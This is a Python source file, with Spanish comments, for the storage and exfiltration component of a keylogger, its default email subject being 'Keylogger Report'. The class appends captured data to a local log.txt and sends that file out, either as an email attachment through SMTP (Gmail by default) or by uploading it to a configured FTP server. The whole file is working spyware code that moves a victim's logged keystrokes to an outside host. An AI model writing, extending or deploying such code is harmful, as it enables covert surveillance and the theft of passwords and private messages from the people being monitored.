import os
import smtplib
import ftplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime
import json

class StorageManager:
    def __init__(self, config_file, logs_dir):
        self.logs_dir = logs_dir
        self.local_log_path = os.path.join(logs_dir, "log.txt")
        self.config = self._load_config(config_file)
        
    def _load_config(self, path):
        try:
            with open(path, 'r') as f:
                return json.load(f)
        except Exception as e:
            print(f"Error cargando config: {e}")
            return {}

    def save_local(self, data):
        """Guarda datos en el archivo local log.txt"""
        try:
            with open(self.local_log_path, "a", encoding="utf-8") as f:
                f.write(data)
        except Exception as e:
            print(f"Error guardando localmente: {e}")

    def send_email(self, subject="Keylogger Report"):
        """Envía el archivo de log por correo."""
        email_conf = self.config.get("email", {})
        if not email_conf:
            return

        sender = email_conf.get("sender")
        password = email_conf.get("password")
        receiver = email_conf.get("receiver")
        
        if not sender or not password or "tu_email" in sender:
            # print("Email no configurado correctamente.")
            return

        try:
            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = f"{subject} - {datetime.now()}"
            
            body = "Adjunto encontrarás el archivo de log actualizado."
            msg.attach(MIMEText(body, 'plain'))
            
            # Adjuntar log.txt
            if os.path.exists(self.local_log_path):
                with open(self.local_log_path, "rb") as attachment:
                    part = MIMEBase("application", "octet-stream")
                    part.set_payload(attachment.read())
                
                encoders.encode_base64(part)
                part.add_header(
                    "Content-Disposition",
                    f"attachment; filename=log.txt",
                )
                msg.attach(part)
                
                # Conectar y enviar
                server = smtplib.SMTP(email_conf.get("smtp_server", "smtp.gmail.com"), email_conf.get("smtp_port", 587))
                server.starttls()
                server.login(sender, password)
                text = msg.as_string()
                server.sendmail(sender, receiver, text)
                server.quit()
                print("[StorageManager] Email enviado.")
            else:
                print("[StorageManager] No hay log para enviar.")
                
        except Exception as e:
            print(f"[StorageManager] Error enviando email: {e}")

    def upload_ftp(self):
        """Sube el archivo de log a un servidor FTP."""
        ftp_conf = self.config.get("ftp", {})
        if not ftp_conf:
            return

        host = ftp_conf.get("host")
        user = ftp_conf.get("user")
        password = ftp_conf.get("password")
        
        if not host or "tuservidor" in host:
            return

        try:
            session = ftplib.FTP(host, user, password)
            if "directory" in ftp_conf:
                session.cwd(ftp_conf["directory"])
            
            if os.path.exists(self.local_log_path):
                with open(self.local_log_path, 'rb') as file:
                    session.storbinary('STOR log.txt', file)
                print("[StorageManager] Archivo subido a FTP.")
            
            session.quit()
        except Exception as e:
            print(f"[StorageManager] Error FTP: {e}")
